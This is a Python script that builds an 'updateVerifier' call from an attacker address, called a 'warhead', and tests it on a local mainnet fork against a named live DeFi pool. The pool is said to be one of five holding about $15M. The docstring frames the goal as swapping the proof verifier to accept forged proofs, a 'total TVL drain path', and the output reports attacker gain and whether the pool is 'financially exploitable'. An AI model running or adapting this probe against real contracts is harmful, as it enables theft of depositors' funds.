#!/usr/bin/env python3
"""Probe whether the ~$15M deposit-only pool cores allow a STRANGER to call
updateVerifier(address) on a local mainnet fork (anvil). $0, local only.

updateVerifier present on all 5 live pools (0x97fc007c). If a random
non-owner can SUCCESS on updateVerifier, the upgradable-verifier surface can
be swapped to accept forged proofs -> total TVL drain path exists.
Divergence engine measures real revert/success on a fork.
"""
import json, os, sys, subprocess, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from zk import divergence as L5D

ADDR = os.environ.get("TGT", "0x12d66f87a04a9e220743712ce6d9bb1b5616b8fc")
ATT = L5D.UNLOCKED_ATTACKER

anvil = L5D.find_anvil()
print("anvil found:", anvil)
if not anvil:
    sys.exit("NO_ANVIL")

# updateVerifier(address new) calldata
data = "0x97fc007c" + "0" * 24 + ATT[2:]
warhead = {
    "to": ADDR.lower(),
    "data": data,
    "label": "updateVerifier_by_stranger",
}
print(f"warhead: updateVerifier({ATT}) on {ADDR.lower()[:14]}...")

# Use the engine's plain-anvil (non-fork) mode? No — need real pool state.
# Fork mainnet so the real pool contract + its TVL are present.
dv = L5D.run_divergence(
    ADDR.lower(), warhead,
    tvl_accounts=[ADDR.lower()],
    label="update_verifier_fork",
    fork_sources=["https://eth.drpc.org"],
    launch_plain_anvil=False,
)
L5D.report(dv)
print()
print(json.dumps({k: dv.get(k) for k in
    ["path", "outcome", "status", "attacker_delta_wei",
     "pre_tvl_wei", "post_tvl_wei", "tvl_delta_wei",
     "effects", "financially_exploitable", "verdict", "gas_used"]}, indent=2))